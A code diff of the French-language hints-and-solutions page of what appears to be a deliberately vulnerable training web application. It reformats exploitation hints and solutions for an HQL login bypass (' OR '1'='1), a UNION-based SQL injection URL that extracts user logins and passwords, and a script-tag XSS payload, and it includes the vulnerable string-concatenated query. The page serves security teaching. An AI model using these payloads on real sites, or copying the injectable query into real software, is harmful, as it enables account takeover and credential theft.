@@ -14,17 +14,37 @@
           </div>
           <div class="panel-body">
             <strong>Conséquence :</strong> Possibilité de se connecter sans connaitre les identifiants
-            <br /><strong>Exploitation (indice 1) :</strong> Le champ login est vulnérable
-            <br /><strong>Exploitation (indice 2) :</strong> La requête HQL est la suivante :
-            <pre>
+            
+            <div class="hint">
+              <div class="hint-title">Exploitation (indice 1) :</div> 
+              <div class="hint-content">Le champ login est vulnérable</div>
+            </div>
+            
+            <div class="hint">
+              <div class="hint-title">Exploitation (indice 2) :</div> 
+              <div class="hint-content">La requête HQL est la suivante 
+              <pre>
   StringBuilder sb = new StringBuilder();
   sb.append("SELECT u FROM " + Utilisateur.class.getName() + " u");
   sb.append(" WHERE pwd='" + password + "'");
   sb.append(" AND login='" + login + "'");
 
-            </pre> 
-            <strong>Exploitation (solution) :</strong> rentrer le code ci-dessous dans l'input login 
-            <pre>' OR '1'='1</pre>
+              </pre> 
+              
+              </div>
+            </div>
+
+
+            <div class="hint">
+              <div class="hint-title">Exploitation (solution) :</div> 
+              <div class="hint-content">rentrer le code ci-dessous dans l'input login 
+              <pre>
+' OR '1'='1
+              </pre> 
+              
+              </div>
+            </div>
+
           </div>
         </div>
         
@@ -35,54 +55,77 @@
           </div>
           <div class="panel-body">
             <strong>Conséquence :</strong> Possibilité de lister n'importe quelle table de la base
-            <br /><strong>Exploitation (indice 1) :</strong> Le paramètre "u" de l'url est vulnérable
-            <br /><strong>Exploitation (indice 2) :</strong> Les informations remontées par la requête sont les suivantes :
-            <table class="table table-bordered">
-              <thead>
-                <tr>
-                  <th>Information</th>
-                  <th>Type</th>
-                </tr>
-              </thead>
-              <tbody>
-                <tr>
-                  <td>Identifiant produit</td>
-                  <td>Integer</td>
-                </tr>
-                <tr>
-                  <td>Titre</td>
-                  <td>String</td>
-                </tr>
-                <tr>
-                  <td>Description</td>
-                  <td>String</td>
-                </tr>
-                <tr>
-                  <td>Prix</td>
-                  <td>Double</td>
-                </tr>
-                <tr>
-                  <td>Image</td>
-                  <td>String</td>
-                </tr>
-                <tr>
-                  <td>Categorie</td>
-                  <td>String</td>
-                </tr>
-                <tr>
-                  <td>Identifiant utilisateur</td>
-                  <td>Integer</td>
-                </tr>
-                <tr>
-                  <td>Login utilisateur</td>
-                  <td>String</td>
-                </tr>
-              </tbody>
+            
+            <div class="hint">
+              <div class="hint-title">Exploitation (indice 1) :</div> 
+              <div class="hint-content">Le paramètre "u" de l'url est vulnérable</div>
+            </div>
+            
+            
+            <div class="hint">
+              <div class="hint-title">Exploitation (indice 2) :</div> 
+              <div class="hint-content">Les informations remontées par la requête sont les suivantes :
               
-            </table>
-            <strong>Exploitation (indice 3) :</strong> La table des utilisateurs s'appelle <i>UTILISATEUR</i>
-            <br /><strong>Exploitation (solution) :</strong> il faut forger une url de la sorte
-            <pre>/produits?u=bijou' UNION SELECT UTI_ID, UTI_LOGIN, UTI_PWD, 1.0, '/resources/img/pirate.png', 'hack', UTI_ID, UTI_LOGIN FROM UTILISATEUR WHERE '1'='1</pre>
+                <table class="table table-bordered">
+                  <thead>
+                    <tr>
+                      <th>Information</th>
+                      <th>Type</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td>Identifiant produit</td>
+                      <td>Integer</td>
+                    </tr>
+                    <tr>
+                      <td>Titre</td>
+                      <td>String</td>
+                    </tr>
+                    <tr>
+                      <td>Description</td>
+                      <td>String</td>
+                    </tr>
+                    <tr>
+                      <td>Prix</td>
+                      <td>Double</td>
+                    </tr>
+                    <tr>
+                      <td>Image</td>
+                      <td>String</td>
+                    </tr>
+                    <tr>
+                      <td>Categorie</td>
+                      <td>String</td>
+                    </tr>
+                    <tr>
+                      <td>Identifiant utilisateur</td>
+                      <td>Integer</td>
+                    </tr>
+                    <tr>
+                      <td>Login utilisateur</td>
+                      <td>String</td>
+                    </tr>
+                  </tbody>
+                  
+                </table>              
+              
+              </div>
+            </div>
+            
+ 
+            <div class="hint">
+              <div class="hint-title">Exploitation (indice 3) :</div> 
+              <div class="hint-content">La table des utilisateurs s'appelle <i>UTILISATEUR</i></div>
+            </div>
+            
+            <div class="hint">
+              <div class="hint-title">Exploitation (solution) :</div> 
+              <div class="hint-content">il faut forger une url de la sorte
+              <pre>/produits?u=bijou' UNION SELECT UTI_ID, UTI_LOGIN, UTI_PWD, 1.0, '/resources/img/pirate.png', 'hack', UTI_ID, UTI_LOGIN FROM UTILISATEUR WHERE '1'='1</pre>
+              
+              </div>
+            </div>
           </div>
         </div>
         
@@ -92,9 +135,19 @@
           </div>
           <div class="panel-body">
             <strong>Conséquence :</strong> Exécution de code javascript lors de l'affichage des commentaires.
-            <br /><strong>Exploitation (indice 1) :</strong> Poster un commentaire contenant du javascript
-            <br /><strong>Exploitation (solution) :</strong> se connecter et poster le commentaire suivant
-            <pre>&lt;script&gt;alert("XSS")&lt;/script&gt;</pre>
+            
+            <div class="hint">
+              <div class="hint-title">Exploitation (indice 1) :</div> 
+              <div class="hint-content">Poster un commentaire contenant du javascript</div>
+            </div>
+            
+            
+            <div class="hint">
+              <div class="hint-title">Exploitation (solution) :</div> 
+              <div class="hint-content">se connecter et poster le commentaire suivant
+                <pre>&lt;script&gt;alert("XSS")&lt;/script&gt;</pre>
+              </div>
+            </div>
           </div>
         </div>
         
